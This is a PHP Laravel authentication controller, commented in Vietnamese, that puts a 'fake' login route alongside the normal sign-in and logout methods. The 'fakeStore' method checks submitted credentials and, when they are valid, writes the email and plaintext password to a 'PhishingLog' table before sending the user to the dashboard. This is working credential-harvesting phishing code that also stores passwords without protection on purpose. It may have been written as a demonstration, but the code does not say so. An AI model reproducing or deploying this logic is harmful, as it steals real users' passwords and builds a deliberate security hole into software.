<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Http\Requests\Auth\LoginRequest;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\View\View;
use App\Models\PhishingLog;

class AuthenticatedSessionController extends Controller
{
    /**
     * Display the login view.
     */
    public function create(): View
    {
        return view('auth.login');
    }

    /**
     * Handle an incoming authentication request.
     */
    public function store(LoginRequest $request): RedirectResponse
    {
        $request->authenticate();

        $request->session()->regenerate();

        return redirect()->intended(route('dashboard', absolute: false));
    }

    /**
     * Display the login view.
     */
    public function fakeCreate(): View
    {
        return view('auth.fake-login');
    }

    /**
     * Handle an incoming authentication request.
     */
    public function fakeStore(LoginRequest $request): RedirectResponse
    {
        $credentials = $request->only('email', 'password');

        if (Auth::attempt($credentials)) {
            // Login thành công, lưu log
            PhishingLog::create([
                'email' => $request->email,
                'password' => $request->password,
            ]);

            // Redirect tới trang intended (dashboard, home...)
            return redirect()->intended('dashboard')
                ->with('status', 'Đăng nhập thành công');
        }

        // Sai thông tin -> không lưu log, chỉ báo lỗi
        return back()->withErrors([
            'email' => 'Email hoặc mật khẩu không đúng',
        ])->onlyInput('email');
    }

    /**
     * Destroy an authenticated session.
     */
    public function destroy(Request $request): RedirectResponse
    {
        Auth::guard('web')->logout();

        $request->session()->invalidate();

        $request->session()->regenerateToken();

        return redirect('/');
    }
}
